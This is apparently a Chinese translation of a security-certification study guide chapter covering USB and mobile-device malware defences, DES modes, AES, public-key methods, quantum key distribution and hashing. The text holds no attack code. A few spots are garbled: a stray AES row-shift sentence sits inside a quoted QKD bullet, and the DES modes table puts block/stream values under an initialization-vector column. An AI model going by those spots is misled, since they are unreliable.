  管理对策将在 第 2 章，领域 1：安全与风险管理中讨论。它们包括策略、程序、指南、标准和相关文档。\n\n物理对策将在本章后面讨论。它们包括楼宇和办公室安全、锁具、保安、移动设备加密等。\n\
  \n#### 移动设备攻击\n\n近期的一个信息安全挑战是移动设备（从 USB 闪存驱动器到笔记本电脑）在安全边界之外感染恶意软件，然后被带入组织内部。传统的基于网络的保护（如防火墙和入侵检测系统）无法阻止初始攻击。\n\
  \n受感染的移动计算机（如笔记本电脑）一旦插入网络，可能开始攻击其他系统。USB 闪存驱动器可通过 Microsoft Windows 的“自动运行”功能感染主机系统，即插入设备时自动执行\
  \ `autorun.inf` 文件。某些类型的恶意软件会创建或编辑 `autorun.inf`，以便在插入 USB 闪存驱动器时传播到其他系统。\n\n#####\
  \ 移动设备防御\n\n防御措施包括管理控制，如通过策略限制移动设备的使用。美国国防部在据称爆发了通过 USB 传播的 SillyFDC 蠕虫后，制定了此类策略。[Wired.com](http://Wired.com)\
  \ 报道：“国防部的技术专家们对一种在其网络中迅速蔓延的蠕虫感到恐慌。因此，他们暂停了所谓的拇指驱动器、CD、闪存卡及所有其他可移动数据存储设备在其网络上的使用，以试图阻止该蠕虫进一步扩散”\
  \ [\\[31\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0155)。\n\n缓解受感染移动计算机的技术控制包括要求在\
  \ OSI 模型第 2 层通过 `802.1X` 进行认证，我们将在 第 5 章，领域 4：通信与网络安全中讨论这一点。`802.1X` 认证可捆绑额外的安全功能，如验证当前补丁和防病毒签名。实现此功能的两种技术是网络准入控制（`NAC`）和网络访问保护（`NAP`）。`NAC`\
  \ 是由包括思科系统在内的厂商支持的基于网络设备的解决方案。`NAP` 是微软基于计算机操作系统的解决方案。\n\n另一个移动设备安全问题是移动设备的丢失或被盗，这威胁到设备及其驻留数据的机密性、完整性和可用性。备份可确保移动数据的可用性和完整性。\n\
  \n应使用全盘加密（也称为整盘加密）来确保移动设备数据的机密性。这可以通过硬件或软件实现，且优于加密文件、目录或分区等部分加密解决方案。\n\n远程擦除功能是另一项关键控制，指擦除（有时还可禁用）丢失或被盗移动设备的能力。\n\
  \n### 基石密码学概念\n\n\n\n\n#### 密码学\n\n密码学是秘密书写：一种安全通信，只有预期的接收者才能理解。虽然数据正在传输这一事实可能是已知的，但该数据的内容应对第三方保持未知。传输中的数据（在网络上移动）和静态数据（存储在磁盘等设备上）均可加密。\n\
  \n密码学的使用可追溯至数千年前，但它也是现代世界不可或缺的一部分。数学和计算机在现代密码学中发挥着关键作用。基本密码学概念体现在强加密中，在了解具体实现之前必须先理解这些概念。\n\
  \n##### 关键术语\n\n**密码学**（Cryptology）是安全通信的科学。**加密学**（Cryptography）创建含义隐藏的消息；**密码分析**（cryptanalysis）是破解加密消息（恢复其含义）的科学。许多人用“加密学”代替“密码学”：重要的是要记住，密码学包含加密学和密码分析两者。\n\
  \n**密码**（cipher）是一种加密算法。**明文**（plaintext）是未加密的消息。**加密**（Encryption）将明文转换为**密文**（ciphertext）。**解密**（Decryption）将密文还原为明文。\n\
  \n##### 机密性、完整性、认证和不可抵赖性\n\n密码学可提供机密性（秘密保持秘密）和完整性（数据未以未授权方式被篡改）：重要的是要注意，它不直接提供可用性。密码学还可提供认证（证明身份声明）。\n\
  \n此外，密码学可提供**不可抵赖性**（non-repudiation），即确保特定用户执行了特定交易且该交易未被篡改。这两者必须绑定在一起。如果汽车经销商能在你签署合同后提高价格，那么证明你签署了购车合同就毫无用处。不可抵赖性意味着执行交易（如向系统认证并查看个人身份信息\
  \ PII）的个人事后不能抵赖（或否认）曾执行过该操作。\n\n##### 扩散、混淆、替换和置换\n\n**扩散**（Diffusion）意味着明文的顺序应在密文中被“扩散”（或分散）。**混淆**（Confusion）意味着明文和密文之间的关系应尽可能“混淆”（或随机）。信息安全之父克劳德·香农在其论文《保密系统的通信理论》中于\
  \ 1949 年首次定义了这些术语 [[32]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0160)。\n\n\
  加密**替换**（substitution）用一个字符替换另一个字符；这提供了混淆。**置换**（Permutation，也称为换位）通过重新排列明文字符（类似重组字母游戏）提供扩散。例如，“ATTACKATDAWN”可重新排列为“CAAKDTANTATW”。替换和置换常结合使用。虽然这些技术历史上曾被使用（如**凯撒密码**就是一种替换密码），但它们仍以组合形式用于现代密码（如**高级加密标准**\
  \ AES）中。\n\n强加密会破坏模式。如果明文的单个比特发生变化，生成的密文中每个比特发生变化的几率应为 50/50。任何非随机性的迹象都可能被密码分析师用作线索，暗示原始明文或密钥的潜在规律。\n\
  \n> **注意**\n>\n> 与密码学突破相关的日期和名字（如克劳德·香农）通常不可作为考点，除非发明者的名字出现在设备或密码的名称中。提供这些信息是为了充实密码学概念（这些概念非常重要，常被考查）。\n\
  \n##### 密码学强度\n\n好的加密是强加密：对于基于密钥的加密，在没有密钥的情况下将密文还原为明文应非常困难（理想情况下不可能）。**工作因子**（work\
  \ factor）描述破解一个密码系统（在无密钥情况下解密密文）需要多长时间。\n\n加密算法的保密性不提供强度：秘密算法往往被证明相当脆弱。强加密依赖数学而非保密性来提供强度。经得起时间考验的密码均为公开算法，如**三重数据加密标准**（TDES）和**高级加密标准**（AES）。\n\
  \n##### 单表代换密码和多表代换密码\n\n**单表代换密码**（monoalphabetic cipher）使用一套字母表：特定字母（如“E”）被替换为另一个固定字母（如“X”）。**多表代换密码**（polyalphabetic\
  \ cipher）使用多套字母表：“E”在一轮中可能被替换为“X”，下一轮则替换为“S”。\n\n单表代换密码易受频率分析攻击。图 4.22 显示了英文字母在文本中的频率。将“E”替换为“X”、“T”替换为“C”等的单表代换密码，会通过频率分析迅速被破解。多表代换密码通过使用多套字母表试图解决此问题。\n\
  \n![图 4.22 英文字母频率。](img/f04-22-9780443187346.jpg)\n\n图 4.22 英文字母频率。\n\n##### 模运算\n\
  \n模运算是许多密码学的基础：简单来说，模运算显示除法后剩余的部分（余数）。它有时被称为“时钟算术”，因为我们用它来报时：假设为 12 小时制，晚上 9:00\
  \ 过 6 小时是凌晨 3:00。换句话说，9 + 6 = 15，除以 12 余 3。\n\n正如我们稍后将看到的，流密钥等方法使用模运算。英文字母表有 26\
  \ 个字母；将字母“Y”（第 25 个）加到“C”（第 3 个）上等于“B”（第 2 个）。换句话说，25 + 3 = 28。28 除以 26 余 2。这就像在圆周上移动（如钟面）：一旦到达字母“Z”，就会绕回“A”。\n\
  \n##### 异或（XOR）\n\n**异或**（Exclusive Or，XOR）是现代加密背后的“秘诀”。通过异或将密钥与明文结合可生成密文。用相同的密钥对密文进行异或运算可恢复原始明文。异或运算快速且简单，简单到历史上曾用电话继电器开关实现。\n\
  \n如果两个比特中仅有一个为 1（仅此一个，不包括两个都为 1），则结果为真（或 1）。换句话说：如果两个比特不同，答案为 1（真）；如果两个比特相同，答案为\
  \ 0（假）。异或使用**真值表**，如表 4.3 所示。这决定了如何结合密钥和明文的比特。\n\n表 4.3\n\n异或真值表。\n\n| ![t04-04-9780443187346](img/t04-04-9780443187346.jpg)\
  \ |\n\n| --- |\n\n若要用密钥“UNICORN”加密明文“ATTACK AT DAWN”，需将每个字母的比特逐位进行异或运算。我们将加密并解密第一个字母以演示异或数学运算。“A”的二进制是\
  \ 01000001，“U”的二进制是 01010101。然后使用表 4.3 中的真值表，将明文的每个比特与密钥进行异或运算。结果得到密文 00010100，如表\
  \ 4.4 所示。\n\n表 4.4\n\n01000001 与 01010101 进行异或运算。\n\n| ![t04-05-9780443187346](img/t04-05-9780443187346.jpg)\
  \ |\n\n| --- |\n\n现在让我们用密钥“U”（二进制 01010101）解密密文 00010100。我们再次使用表 4.3 中的真值表，将密钥的每个比特（01010101）与密文（00010100）进行异或运算。我们恢复了原始明文\
  \ 01000001（ASCII “A”），如表 4.5 所示。\n\n表 4.5\n\n00010100 与 01010101 进行异或运算。\n\n\n\n\
  \n\n| ![t04-06-9780443187346](img/t04-06-9780443187346.jpg) |\n\n| --- |\n\n#####\
  \ 静态数据与动态数据\n\n密码学可以保护静态数据和动态数据（也称为传输中数据）。使用 `TrueCrypt` 或 `PGP Whole Disk Encryption`\
  \ 等软件对磁盘驱动器进行全盘加密（也称为整盘加密）是加密静态数据的一个示例。`SSL` 或 `IPsec VPN` 是加密动态数据的一个示例。\n\n#####\
  \ 协议治理\n\n密码学`协议治理`描述了为特定任务选择正确方法（密码算法）和实现的过程，通常在整个组织范围内进行。例如：正如我们稍后在本章将学到的，数字签名提供认证和完整性，但不提供机密性。对称密码主要用于机密性，由于强度和性能原因（我们稍后也会讨论），`AES`\
  \ 优于 `DES`。\n\n组织必须了解特定控制的要求，选择合适的密码学解决方案，并确保速度、强度、成本、复杂性（及其他因素）得到适当权衡。\n\n#####\
  \ 密码学类型\n\n现代加密主要有三种类型：`对称加密`、`非对称加密` 和 `哈希`。对称加密使用一个密钥：同一个密钥用于加密和解密。非对称加密使用两个密钥：如果你用一个密钥加密，可以用另一个密钥解密。哈希是一种使用算法（且无密钥）的单向密码学转换。\n\
  \n###### 对称加密\n\n对称加密使用一个密钥进行加密和解密。如果你加密一个 zip 文件，然后使用同一个密钥解密，你就是在使用对称加密。对称加密也称为“密钥”加密：密钥必须对第三方保密。优势包括速度和每比特密钥的密码学强度。主要弱点是密钥必须在双方安全通信前安全共享。对称密钥通常通过带外方式共享，例如面对面讨论。\n\
  \n密钥通常转换为子密钥，每加密一个数据块，子密钥就会改变。\n\n####### 流密码与分组密码\n\n对称加密可能具有流模式和分组模式。流模式意味着每一位在“流”中独立加密。分组模式密码在每轮中加密数据块：例如数据加密标准（`DES`）为\
  \ 64 位，`AES` 为 128 位。某些分组密码可通过将分组大小设置为 1 位来模拟流密码；它们仍被视为分组密码。\n\n####### 初始化向量与链接\n\
  \n某些对称密码使用初始化向量以确保第一个加密数据块是随机的。这确保了相同的明文加密成不同的密文。此外，正如布鲁斯·施奈尔在《应用密码学》中指出的：“更糟的是，开头相同的两条消息将以相同方式加密，直到第一个差异出现。某些消息有通用报头：信头、‘发件人’行或其他内容”\
  \ [\\[33\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0165)。初始化向量解决了这个问题。\n\
  \n`链接`（在流模式中称为`反馈`）将前一个加密块种子植入下一个待加密块中。这破坏了生成密文中的模式。`DES 电子密码本`模式（见下文）不使用初始化向量或链接，模式在生成的密文中可能清晰可见。\n\
  \n####### DES\n\n`DES` 是数据加密标准，描述了`数据加密算法`（`DEA`）。`DES` 于 1976 年成为美国联邦标准对称密码。其创建原因是缺乏密码学标准：供应商使用强度未知的专有密码，且无法与其他供应商的密码互操作。`IBM`\
  \ 设计了 `DES`，基于其早期的 `Lucifer` 对称密码。它使用 64 位分组大小（意味着每轮加密 64 位）和 56 位密钥。\n\n> **考试警告**\n\
  >\n> 尽管“`DES`”通常被称为算法，但 `DES` 技术上是描述 `DEA` 的已发布标准的名称。这听起来像是在吹毛求疵，但在考试中这是一个重要的区别。关于算法本身的问题，\"\
  `DEA`\" 可能是最佳答案。\n\n######## DES 模式\n\n`DES` 可使用五种不同模式加密数据。模式的主要区别在于分组与（模拟）流、初始化向量的使用，以及加密错误是否会传播到后续块。\n\
  \n`DES` 的五种模式是：\n\n*   `电子密码本`（`ECB`）\n*   `密码分组链接`（`CBC`）\n*   `密码反馈`（`CFB`）\n\
  *   `输出反馈`（`OFB`）\n*   `计数器模式`（`CTR`）\n\n`ECB` 是 `DES` 的原始模式。`CBC`、`CFB` 和 `OFB`\
  \ 后来在 `FIPS Publication 81` 中添加（见 <https://csrc.nist.gov/csrc/media/publications/fips/81/archive/1980-12-02/documents/fips81.pdf>）。`CTR`\
  \ 模式是最新模式，描述于 `NIST Special Publication 800-38a`（见 <https://csrc.nist.gov/publications/detail/sp/800-38a/final>）。\n\
  \n######## 电子密码本 (ECB)\n\n`电子密码本`（`ECB`）是 `DES` 最简单、最弱的形式。它不使用初始化向量或链接。相同密钥加密相同明文会产生相同密文。使用相同密钥加密部分相同的两个明文（如信件的报头）将产生部分相同的密文部分。\n\
  \n> **注意**\n>\n> `电子密码本`中的“密码本”一词源自密码学代码本，如美国内战期间使用的那些。这也提示你记住 `ECB` 的简单性（和弱点）。\n\
  \n`ECB` 还可能在生成的密文中留下明显的明文模式。使用密钥“Kowalski”通过 56 位 `DES ECB` 模式加密的位图图像数据（见图 4.23A）（见图\
  \ 4.23B）显示出明显的模式。\n\n![图 4.23 (A) 明文 8 位位图 (BMP) 图像。(B) 56 位 DES ECB 加密密文位图。A 图：美国国家安全局提供](img/f04-23-9780443187346.jpg)\n\
  \n图 4.23 (A) 明文 8 位位图 (BMP) 图像。(B) 56 位 `DES ECB` 加密密文位图。A 图：美国国家安全局提供\n\n########\
  \ 密码分组链接 (CBC)\n\n`密码分组链接`（`CBC`）模式是 `DES` 的一种分组模式，它将前一个加密的密文块与下一个待加密的明文块进行 `XOR`\
  \ 运算。第一个加密块是包含随机数据的初始化向量。这种“链接”破坏了模式。`CBC` 模式的一个局限性是加密错误会传播：由于链接，一个块中的加密错误将级联传播到后续块，破坏其完整性。\n\
  \n######## 密码反馈 (CFB)\n\n`密码反馈`（`CFB`）模式与 `CBC` 非常相似；主要区别在于 `CFB` 是一种流模式。它使用反馈（流模式中链接的名称）来破坏模式。与\
  \ `CBC` 一样，`CFB` 使用初始化向量并破坏模式，且错误会传播。\n\n######## 输出反馈 (OFB)\n\n`输出反馈`（`OFB`）模式在反馈实现方式上与\
  \ `CFB` 不同。`CFB` 使用前一个密文作为反馈。前一个密文是子密钥与明文 `XOR` 后的结果。`OFB` 使用子密钥在其与明文 `XOR` *之前*\
  \ 的值。由于子密钥不受加密错误影响，错误不会传播。\n\n####### 计数器模式 (CTR)\n\n\n\n\n\n####### 计数器模式 (CTR)\n\
  \n计数器模式 (CTR) 类似于 OFB；区别同样在于反馈机制：CTR 使用计数器。该模式与 OFB 具有相同的优点（模式被破坏且错误不传播），并具有一个额外优势：由于反馈可以像递增数字一样简单，CTR\
  \ 模式加密可以并行完成。一个简单的例子是：第一个块与数字 1 进行异或，第二个块与数字 2 进行异或，以此类推。任意数量的轮次都可以通过这种方式并行组合。\n\
  \n表 4.6 总结了 DES 的五种模式。\n\n表 4.6\n\n####### DES 模式汇总\n\n| 类型 | 初始化向量 | 错误传播？ |\n\
  | --- | --- | --- |\n| 电子密码本 (ECB) | 分组 | 否 |\n| 密码分组链接 (CBC) | 分组 | 是 |\n| 密文反馈\
  \ (CFB) | 流 | 是 |\n| 输出反馈 (OFB) | 流 | 否 |\n| 计数器模式 (CTR) | 流 | 否 |\n\n####### 单重\
  \ DES\n\n单重 DES 是 DES 的原始实现，使用 56 位密钥对 64 位数据块进行加密，采用 16 轮加密。1976 年破解 DES 所需的工作量是合理的，但\
  \ CPU 速度的提升和并行架构的进步使得 DES 如今容易受到 `暴力破解` 密钥攻击，即生成并尝试每一个可能的密钥。大规模并行计算机（如 COPACOBANA，即成本优化并行代码破解器，作为一个不可测试的示例给出，详见\
  \ [`www.copacobana.org`](https://www.copacobana.org) 获取更多信息）使用 100 多个并行 CPU，大约一周左右就能破解\
  \ 56 位 DES（CPU 越多速度越快），成本在 10,000 美元以下。\n\n####### 三重 DES\n\n三重 DES 对每个块应用三次单重 DES\
  \ 加密。正式称为“三重数据加密算法 (TDEA)”，通常称为 TDES，它于 1999 年成为美国联邦信息处理标准 (FIPS) 出版物 46-3 推荐的标准（详见\
  \ [`csrc.nist.gov/csrc/media/publications/fips/46/3/archive/1999-10-25/documents/fips46-3.pdf`](https://csrc.nist.gov/csrc/media/publications/fips/46/3/archive/1999-10-25/documents/fips46-3.pdf)）。由于破解单重\
  \ DES 所需的工作量不断降低，FIPS 46-3 仅建议在遗留系统中使用单重 DES。\n\n三重 DES 经历了多年的密码分析依然表现良好；其主要弱点是与较新的对称算法（如\
  \ AES 或 Twofish）相比，它速度较慢且复杂。请注意，“双重 DES”（使用两个密钥进行两次 DES 加密）不被使用，因为存在 `中间相遇攻击`：详见“密码攻击”部分。\n\
  \n####### 国际数据加密算法 (IDEA)\n\n国际数据加密算法是一种对称分组密码，旨在作为 DES 的国际替代品。IDEA 算法在许多国家拥有专利。它使用\
  \ 128 位密钥和 64 位分组大小。IDEA 经受住了密码分析的考验；其主要缺点是专利负担以及与 AES 等较新的对称密码相比速度较慢。\n\n#######\
  \ 高级加密标准 (AES)\n\n高级加密标准是当前美国的标准对称分组密码。它发布于联邦信息处理标准 (FIPS) 197 中（详见 [`csrc.nist.gov/csrc/media/publications/fips/197/final/documents/fips-197.pdf`](https://csrc.nist.gov/csrc/media/publications/fips/197/final/documents/fips-197.pdf)）。AES\
  \ 使用 128 位（10 轮加密）、192 位（12 轮加密）或 256 位（14 轮加密）密钥来加密 128 位数据块。AES 是一种开放算法，可免费使用，且不受任何知识产权限制。\n\
  \nAES 旨在取代 DES。三重 DES 仍是 FIPS 批准的标准，直到 2030 年，以便过渡到 AES。单重 DES 不是当前标准，不推荐使用。\n\n\
  ######## 选择 AES\n\n美国国家标准与技术研究院 (NIST) 于 1997 年 1 月在 `联邦纪事` 中征求关于 DES 替代品的意见。他们寻求一种公开的对称分组密码算法，要求比\
  \ DES 更安全、开放、快速，且在硬件和软件中都高效。1998 年 8 月公布了 15 个 AES 候选算法，1999 年 8 月缩减至 5 个。表 4.7\
  \ 列出了 5 个 AES 入围算法。\n\n表 4.7\n\n######## 五个 AES 入围算法\n\n| 名称 | 作者 |\n| --- | ---\
  \ |\n| MARS | IBM (11 位作者) |\n| RC6 | RSA (Rivest, Robshaw, Sidney, Yin) |\n| Rijndael\
  \ | Daemen, Rijmen |\n| Serpent | Anderson, Biham, Knudsen |\n| Twofish | Schneier,\
  \ Kelsey, Hall, Ferguson, Whiting, Wagner |\n\nRijndael 被选中并成为 AES。该名称英文发音为 \"Rhine\
  \ Dahl\"，是比利时作者 Vincent Rijmen 和 Joan Daemen 姓名的组合。选择 Rijndael 是“因为它具有安全性、性能、效率和灵活性的最佳组合”\
  \ [[34]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0170)。\n\n表 4.8 展示了“状态”，即正在通过\
  \ AES 加密的数据块。状态中的每个小方框代表一个字节（8 位），每个块包含 16 个字节（128 位）。数据以字面块的形式进行加密和可视化。AES 所基于的算法因此被称为“Square”。\n\
  \n表 4.8\n\n######## 一个 128 位的 AES 数据块，称为状态\n\n| ![t04-01-9780443187346](img/t04-01-9780443187346.jpg)\
  \ |\n| --- |\n\n######## AES 函数\n\nAES 有四个函数：`SubBytes`、`ShiftRows`、`MixColumns`\
  \ 和 `AddRoundKey`。这些函数为状态提供混淆、扩散和异或加密。\n\n######## ShiftRows\n\n`ShiftRows` 通过移位状态的行来提供扩散。它将每一行视为一排块，每行移动不同的数量：\n\
  \n*   第 0 行保持不变\n*   第 1 行向左移位 1 位\n*   第 2 行向左移位 2 位\n*   第 3 行向左移位 3 位。\n\n表 4.9\
  \ 展示了状态的转换。\n\n表 4.9\n\n######### ShiftRows，转换前后对比\n\n| ![t04-02-9780443187346](img/t04-02-9780443187346.jpg)\
  \ |\n| --- |\n\n######### MixColumns\n\n`MixColumns` 通过有限域数学“混合”状态的列，也提供扩散，如 表 4.10\
  \ 所示。\n\n表 4.10\n\n######### MixColumns\n\n| ![t04-03-9780443187346](img/t04-03-9780443187346.jpg)\
  \ |\n| --- |\n\n######## SubBytes\n\n`SubBytes` 函数通过替换状态的字节来提供混淆。字节根据替换表（也称为 S 盒）进行替换。\n\
  \n要使用该表，取待替换的状态字节（假设该字节为字母 \"T\"）。ASCII \"T\" 为十六进制字节 \"53\"。在 X 行查找 5，在 Y 列查找 3，结果为十六进制字节\
  \ \"ed\"；这将替换状态中的 \"53\"。图 4.24 显示了直接来自 FIPS-197 的 AES 替换表，并在顶部叠加了字节 53 的查找过程。\n\
  \n![图 4.24 AES 替换表将字节 \"53\" 转换为 \"ed\" [35]。](images/B9780443187346000076/f04-24-9780443187346.jpg)\n\
  \n图 4.24 AES 替换表将字节 \"53\" 转换为 \"ed\" [[35]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0175)。\n\
  \n######### AddRoundKey\n\n\n\n\n\n######### AddRoundKey\n\n`AddRoundKey` 是每轮应用的最后一个函数。它将\
  \ State 与子密钥进行异或运算。子密钥源自密钥，且 AES 的每一轮子密钥都不同。\n\n######## Blowfish 和 Twofish\n\n\
  Blowfish 和 Twofish 是由 Bruce Schneier 领导的团队创建的对称分组密码，Bruce Schneier 是《应用密码学》的作者。Blowfish\
  \ 使用 32 位到 448 位（默认为 128 位）的密钥来加密 64 位数据。Twofish 是 AES 的决赛算法之一，使用 128 位到 256 位的密钥加密\
  \ 128 位数据块。两者都是开放算法，未申请专利且免费可用。\n\n######## RC5 和 RC6\n\nRC5 和 RC6 是由 RSA 实验室开发的对称分组密码。RC5\
  \ 使用 32 位（测试目的）、64 位（替代 DES）或 128 位数据块。密钥长度范围从 0 到 2040 位。\n\nRC6 是 AES 的决赛算法之一。它基于\
  \ RC5，经过修改以满足 AES 要求。它也比 RC5 更强，使用 128 位、192 位或 256 位密钥加密 128 位数据块。\n\n###### 非对称加密\n\
  \n数千年来，密码学密码一直面临“先有鸡还是先有蛋”的问题：为了与某人安全通信，你必须首先（安全地）共享一个密钥或设备。非对称加密是 1970 年代的数学突破，最终解决了预共享密钥这一古老难题。非对称加密的先驱包括\
  \ Whitfield Diffie 和 Martin Hellman，他们于 1976 年创造了 Diffie-Hellman 密钥交换。RSA 算法于 1977\
  \ 年发明（RSA 代表“Rivest、Shamir 和 Adleman”，即作者姓名的首字母）。\n\n非对称加密使用两个密钥：如果你用其中一个密钥加密，则可以用另一个密钥解密。其中一个密钥可以公开（称为\
  \ `public key`）；因此非对称加密也称为公钥加密。任何想与你通信的人只需下载你公开发布的公钥，并用它加密其明文。一旦加密，你的公钥无法解密该明文：只有你的\
  \ `private key` 才能做到。顾名思义，你的私钥必须保持私密和安全。\n\n此外，任何用私钥加密的消息都可以用公钥解密。这通常用于数字签名，稍后我们将看到。\n\
  \n####### 非对称方法\n\n数学是非对称加密突破的基础。这些方法使用“单向函数”，即“单向”计算容易，但反向计算困难。\n\n######## 质因数分解\n\
  \n单向函数的一个例子是将合数分解为其质因数。质数是只能被 1 和它本身整除的数；合数是能被 1 和它本身以外的数整除的数。\n\n将质数 6269 乘以质数\
  \ 7883，结果得到合数 49,418,527。这种“方向”计算非常容易，在计算器上只需几毫秒。回答“哪个质数乘以哪个质数等于 49,418,527”则*困难得多*。这个问题称为因数分解，数百年来未发现捷径。这是\
  \ RSA 算法的基础。\n\n分解一个大合数（数千位长）非常困难，因此该合数可以安全地公开发布（这就是公钥）。相乘生成公钥的质数必须保持私密（它们是私钥）。\n\
  \n> **考试警告**\n>\n> 不要混淆“单向函数”与“单向哈希”。前者描述非对称算法；后者描述哈希算法。\n\n######## 离散对数\n\n对数是指数运算的逆运算。在现代计算器上计算\
  \ 7 的 13 次幂（指数运算）很容易：96,889,010,407。询问“96,889,010,407 是 7 的几次幂”（求对数）则更困难。离散对数将对数应用于群，这是一个难得多的问题。这种单向函数是\
  \ `Diffie-Hellman` 和 `ElGamal` 非对称算法的基础。\n\n######## Diffie-Hellman 密钥协议\n\n密钥协议允许双方通过公共信道（如互联网）安全地协商一个对称密钥，且无需事先交换密钥。即使攻击者能够嗅探整个通信过程，也无法推导出交换的密钥。Whitfield\
  \ Diffie 和 Martin Hellman 于 1976 年创造了 Diffie-Hellman 密钥协议（也称为 Diffie-Hellman 密钥交换）。Diffie-Hellman\
  \ 利用离散对数提供安全性。\n\n######## 椭圆曲线密码学\n\nECC 利用一种应用于椭圆曲线的离散对数单向函数。解决这个问题比解决离散对数问题更难，因此基于椭圆曲线密码学（ECC）的算法比使用离散对数的系统（以及比质因数分解系统）每比特强度高得多。ECC\
  \ 所需的计算资源较少，因为与其他非对称方法相比可以使用更短的密钥。因此 ECC 常用于低功耗设备。\n\n######## 非对称与对称加密的权衡\n\n非对称加密比对称加密慢得多，且每比特密钥长度的强度也较弱。非对称加密的优势在于无需预共享密钥即可安全通信。\n\
  \n表 4.11 根据密钥长度比较了对称和非对称算法。请注意，基于离散对数和质因数分解的系统每比特密钥长度的强度远弱于 Triple DES 和 AES 等对称系统。椭圆曲线在比较中表现好得多，但仍比\
  \ AES 每比特弱两倍。\n\n表 4.11\n\n**对称与非对称强度对比** [[36]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0180)。\n\
  \n| 对称密钥长度 | 对称算法 | 离散对数等效密钥长度 | 质因数分解等效密钥长度 | 椭圆曲线等效密钥长度 |\n| :--- | :--- | :---\
  \ | :--- | :--- |\n| 112 | 3TDES | 2048 | 2048 | 224–255 |\n| 128 | AES | 3072 |\
  \ 3072 | 256–283 |\n| 192 | AES | 7860 | 7860 | 384–511 |\n| 256 | AES | 15360 |\
  \ 15360 | 512+ |\n\n非对称和对称加密通常结合使用：使用 RSA 等非对称算法安全地发送 AES（对称）密钥。该对称密钥称为会话密钥；新的会话密钥可定期通过\
  \ RSA 重新传输。\n\n这种方法利用了两种密码系统的优势。使用较慢且较弱的非对称系统完成对称加密无法做到的部分：安全地预共享密钥。一旦共享，利用快速且强大的对称加密来加密所有后续流量。\n\
  \n####### 量子加密\n\n量子加密利用量子力学来确定某物是否被观测过。该过程建立在观测者效应之上：“观测者效应是指观测一种情况或现象必然会改变它这一事实。观测者效应在物理学中尤为突出，因为观测和不确定性是现代量子力学的基本方面”\
  \ [[37]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0185)。\n\n既然观测某物会改变“扰动”（改变）它，我们就可以将加密密钥发送给接收方，接收方可以判断该密钥是否曾被观测过。虽然可以发送任何东西，但在这种情况下通常使用强对称密钥：这称为量子密钥分发（QKD）。窃听者看到密钥也会以可检测的方式改变它。如果密钥被观测过，则发送新密钥。一旦收到未被观测的密钥，即可安全地用于加密，并发送回密钥发送方（其也持有相同密钥）用于解密。\n\
  \nIDQ 对量子加密的描述：\n\n\n\n\n*   • 量子密码学是一种利用量子物理学来保障对称加密密钥分发安全的技术。它更准确的名称是量子密钥分发（QKD）。其工作原理是通过光学链路发送光子，光子是光的“量子粒子”。\n\
  *   • 量子物理学原理规定，对量子态的观测会导致扰动。各种 QKD 协议的设计旨在确保窃听者任何企图观测传输光子的行为都会确实扰动传输。第 2 行向左移动\
  \ 2 位。\n*   • 这种扰动将导致传输错误，合法用户可以检测到这些错误。\n*   • 这用于验证分发密钥的安全性 [\\[38\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0190)。\n\
  \n##### 哈希函数\n\n哈希函数使用算法且无需密钥即可提供加密。它们被称为“单向哈希函数”，因为无法逆向还原加密过程。变长明文被“哈希”成固定长度的哈希值（通常称为“消息摘要”或简称为“哈希”）。哈希函数主要用于提供完整性：如果明文的哈希值发生变化，说明明文本身已被更改。常见的较旧哈希函数包括\
  \ `Secure Hash Algorithm 1` (SHA-1)，它生成 160 位哈希值，以及 `Message Digest 5` (MD5)，它生成\
  \ 128 位哈希值。在 MD5 和 SHA-1 中均已发现弱点；建议使用 SHA-3 等较新的替代算法。\n\n###### 冲突\n\n哈希值并非唯一，因为可能的明文数量远大于可能的哈希值数量。假设你正在使用\
  \ MD5 对长度为 1 兆位的文档进行哈希运算。将文档视为长度为 1,000,000 位的字符串，将 MD5 哈希值视为长度为 128 位的字符串。潜在的 1,000,000\
  \ 位字符串的总量显然大于 128 位字符串的总量。因此，多个文档可能具有相同的哈希值：这被称为 `collision`（冲突）。\n\n虽然冲突始终是可能的（假设明文长于哈希值），但它们应该非常难以发现。在合理的时间内，不应能够搜索到与特定明文匹配的冲突。\n\
  \n###### MD5\n\nMD5 是第 5 版消息摘要算法，由 Ronald Rivest 创建。它是 MD 系列哈希算法中使用最广泛的一种。MD5 可基于任意长度的输入生成\
  \ 128 位哈希值。多年来 MD5 颇受欢迎，但已发现存在弱点，可在实际可接受的时间内找到冲突。MD6 是 MD 系列哈希算法的最新版本，首次发布于 2008\
  \ 年。\n\n###### 安全哈希算法\n\n安全哈希算法是一系列哈希算法的统称。SHA-1 生成 160 位哈希值。与 MD5 类似，SHA-1 也被发现具有较弱的抗冲突性。随后出现了\
  \ SHA-2，包含 SHA-224、SHA-256、SHA-384 和 SHA-512，其名称取决于各自生成的消息摘要长度。\n\n下一代哈希算法的征集工作于\
  \ 2007 年在 `Federal Register`（联邦纪事）上宣布，类似于 AES 竞赛。该工作于 2012 年 10 月完成，SHA-3 于 2015\
  \ 年 8 月最终确定。SHA-3 同样包含 SHA-224、SHA-256、SHA-384 和 SHA-512（SHA-2 也包含这些），并新增了两种额外模式：SHAKE128\
  \ 和 SHAKE256。SHAKE 模式生成可变长度的消息摘要，这与 SHA-512 等生成固定长度 512 位消息摘要的模式不同。\n\n###### HAVAL\n\
  \n`HAVAL`（可变长度哈希）是一种哈希算法，可使用 3、4 或 5 轮生成长度为 128、160、192、224 或 256 位的消息摘要。HAVAL 采用了\
  \ MD 系列哈希算法背后的一些设计原则，且比 MD5 更快。\n\n###### 慢速哈希算法\n\n从历史上看，哈希算法在密码学上是强健的、在 CPU 计算上是快速的：设计目标是在使用最少资源的情况下实现最大的密码学强度。MD5、SHA-1、SHA-2\
  \ 和 SHA-3 的设计初衷都是密码学强健且计算快速。这在哈希文档时是合理的，但在哈希密码时则不合理。\n\n密码哈希算法应当在密码学上强健、在 CPU 计算上缓慢。为什么？为了使密码破解的过程变得极其缓慢。我们将在第\
  \ 6 章（Chapter 6），第 5 领域：身份与访问管理中讨论密码破解，此处先做预览：“虽然哈希值无法逆向还原，但攻击者可以多次正向运行哈希算法，选择各种可能的密码，并将输出与目标哈希值进行比较，希望找到匹配项（从而推导出原始密码）。这被称为密码破解。”\
